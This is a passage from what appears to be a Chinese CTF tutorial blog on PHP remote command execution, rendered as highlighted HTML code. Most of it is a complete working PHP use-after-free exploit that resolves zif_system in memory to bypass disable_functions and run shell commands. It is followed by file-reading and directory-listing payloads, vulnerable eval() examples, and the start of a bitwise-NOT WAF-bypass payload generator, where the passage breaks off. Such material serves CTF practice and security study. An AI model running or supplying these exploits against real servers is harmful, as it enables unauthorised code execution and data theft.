class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="绕过disable-function">绕过disable_function</h5><p><strong>适用于eval类命令执行</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#扫描根目录有什么文件</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>().<span class="string">&quot; &quot;</span>);&#125; </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;/&#x27;</span>);<span class="keyword">while</span>((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$a</span>)) !=<span class="literal">false</span>)&#123;<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot; &quot;</span>;&#125;    </span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;/&#x27;</span>);<span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$a</span>)) != <span class="literal">false</span>) &#123;<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取的话一般都是用的include(),highlight_file(),show_source(),readfile(),require(),require_once()等函数进行读取</span></span><br></pre></td></tr></table></figure><p>如果结果被替换，可以在代码后边加一个exit退出，进而绕过对于结果的替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;/&#x27;</span>);<span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$a</span>)) != <span class="literal">false</span>) &#123;<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&quot;</span>;&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h3 id="eval类命令执行">eval类命令执行</h3><p>所谓eval类命令执行即原题中给出了eval()这一函数，并让其参数可控</p><p><strong>示例代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>eval函数的本质是将任意字符串当作php代码执行，我们在进行get和post传参是传入的参数默认都是字符串形式的，正好也一定会符合这个条件</p><h4 id="无字母数字rce">无字母数字rce</h4><p>简单来说，无字母数字rce就是把我们可控参数中的数字和字母都ban掉了，我们需要通过不可见字符的运算构造出可见字符，并执行相应命令，下面的绕过姿势本质都是通过不可见字符之间的关系运算构造出我们所需要的字符串并执行我们的恶意命令。</p><p><strong>示例代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="取反绕过">取反绕过</h5><p>通过取反操作使得原命令变为不可见字符，绕过waf检测，在eval执行时再通过取反操作还原为原恶意命令，进行执行任意恶意代码</p><p><strong>构造脚本1</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;call_user_func&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;system&#x27;</span>));</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span 